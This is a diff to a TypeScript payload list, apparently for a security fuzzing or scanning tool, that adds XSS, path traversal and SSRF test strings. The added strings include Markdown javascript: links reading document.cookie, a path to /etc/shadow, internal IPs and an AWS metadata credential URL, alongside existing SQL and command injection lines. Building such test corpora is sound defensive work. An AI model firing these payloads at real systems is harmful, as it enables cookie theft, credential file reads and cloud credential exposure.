@@ -18,6 +18,18 @@ export const STRING_ATTACKS: { [key: string]: AttackPayload[] } = {
         },
         {
             severity: SeverityLevel.HIGH,
+            messages: ['SVG payload XSS injection'],
+            payload: '<svgonload=alert(1)>',
+            tags: ['xss', 'advanced', 'svg']
+        },
+        {
+            severity: SeverityLevel.HIGH,
+            messages: ['DIV payload XSS injection'],
+            payload: 'Hello<div onpointerout="alert(45)">World</div>',
+            tags: ['xss', 'advanced', 'div'],
+        },
+        {
+            severity: SeverityLevel.HIGH,
             messages: ['Basic SQL injection'],
             payload: '"; DROP ALL DATABASES; --',
             tags: ['sql', 'basic']
@@ -46,6 +58,30 @@ export const STRING_ATTACKS: { [key: string]: AttackPayload[] } = {
             payload: `something%0Acat%20/etc/passwd`,
             tags: ['eval', 'rce']
         },
+        {
+            severity: SeverityLevel.MEDIUM,
+            messages: [`XSS bypass attempt for Markdown parsers`],
+            payload: `[a](javascript:prompt(document.cookie))`,
+            tags: ['xss', 'markdown']
+        },
+        {
+            severity: SeverityLevel.MEDIUM,
+            messages: [`XSS bypass attempt for Markdown parsers`],
+            payload: `[a](j a v a s c r i p t:prompt(document.cookie))`,
+            tags: ['xss', 'markdown']
+        },
+        {
+            severity: SeverityLevel.MEDIUM,
+            messages: [`XSS bypass attempt for Markdown parsers`],
+            payload: `[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)`,
+            tags: ['xss', 'markdown']
+        },
+        {
+            severity: SeverityLevel.MEDIUM,
+            messages: [`XSS bypass attempt for Markdown parsers`],
+            payload: `[a](javascript:window.onerror=alert;throw%201)`,
+            tags: ['xss', 'markdown']
+        },
         // Not possible now due to lack of output formatting
         /*{
             severity: SeverityLevel.LOW,
@@ -60,7 +96,13 @@ export const STRING_ATTACKS: { [key: string]: AttackPayload[] } = {
             severity: SeverityLevel.MEDIUM,
             messages: [`Extracting environment using dedicated process file`],
             payload: '/proc/self/environ',
-            tags: ['path-traversal']
+            tags: ['path-traversal', 'lfi']
+        },
+        {
+            severity: SeverityLevel.HIGH,
+            messages: [`Extracting Linux hashed credentials in shadow file`],
+            payload: '../../../../../../etc/shadow',
+            tags: ['path-traversal', 'lfi']
         },
         {
             severity: SeverityLevel.LOW,
@@ -81,9 +123,33 @@ export const STRING_ATTACKS: { [key: string]: AttackPayload[] } = {
     IP: [
         {
             severity: SeverityLevel.MEDIUM,
-            messages: ['No IP restriction on private ranges may cause SSRF'],
+            messages: ['No IPv4 restriction on localhost may cause SSRF on local services'],
             payload: `127.0.0.1`,
-            tags: ['ssrf']
+            tags: ['ssrf','network']
+        },
+        {
+            severity: SeverityLevel.MEDIUM,
+            messages: ['No IPv4 restriction on private ranges may cause internal network SSRF'],
+            payload: `10.10.124.110`,
+            tags: ['ssrf','network']
+        },
+        {
+            severity: SeverityLevel.MEDIUM,
+            messages: ['No IPv4 restriction on private ranges may cause internal network SSRF'],
+            payload: `192.168.1.56`,
+            tags: ['ssrf','network']
+        },
+        {
+            severity: SeverityLevel.INFO,
+            messages: ['Network IPv4 reserved address may cause unknown actions'],
+            payload: `0.0.0.0`,
+            tags: ['network']
+        },
+        {
+            severity: SeverityLevel.LOW,
+            messages: ['Network IPv4 reserved address may cause unknown actions'],
+            payload: `255.255.255.255`,
+            tags: ['network', 'broadcast']
         }
     ],
 
@@ -123,6 +189,12 @@ export const STRING_ATTACKS: { [key: string]: AttackPayload[] } = {
             messages: ['SSRF attack on AWS bucket'],
             payload: 'http://instance-data/latest/meta-data/iam/security-credentials/',
             tags: ['ssrf','aws']
+        },
+        {
+            severity: SeverityLevel.LOW,
+            messages: ['Reflected XSS in URL parameter'],
+            payload: 'https://domain.com/search.html?query=<svg onload=alert(1)>&lang=en',
+            tags: ['xss', 'reflected']
         }
     ]
 
